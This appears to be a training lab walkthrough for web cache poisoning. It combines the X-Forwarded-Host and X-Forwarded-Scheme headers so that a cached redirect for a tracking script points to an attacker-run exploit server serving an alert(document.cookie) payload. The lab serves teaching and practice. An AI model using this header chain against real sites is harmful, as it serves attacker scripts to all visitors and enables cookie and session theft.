# Lab 03 — Web Cache Poisoning With Multiple Headers

## Objective

Use multiple headers together to poison the cache with a response executing `alert(document.cookie)`.

## Step 1 — Find the resource request

1. Load the home page with Burp.
2. In HTTP history, locate:

```text
/resources/js/tracking.js
```

3. Send it to Repeater.

## Step 2 — Test X-Forwarded-Host

Add a cache buster and:

```http
X-Forwarded-Host: example.com
```

Observe that this alone does not produce the needed behavior.

## Step 3 — Discover the second header

Replace it with:

```http
X-Forwarded-Scheme: nothttps
```

The source states that values other than HTTPS produce a 302 response.

## Step 4 — Combine the headers

Use:

```http
X-Forwarded-Host: example.com
X-Forwarded-Scheme: nothttps
```

The redirect should now point to:

```text
https://example.com/
```

## Step 5 — Prepare exploit

On the exploit server create:

```text
/resources/js/tracking.js
```

with:

```javascript
alert(document.cookie)
```

## Step 6 — Final poison

Use your exploit server ID in:

```http
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
X-Forwarded-Scheme: nothttps
```

Replay until the exploit URL is reflected and `X-Cache: hit` appears.

Verify by copying the URL and loading it in Burp's browser. Then remove the cache buster, re-poison, and reload the home page to simulate the victim.

## Key Learning

Two individually insufficient behaviors can become exploitable when chained.
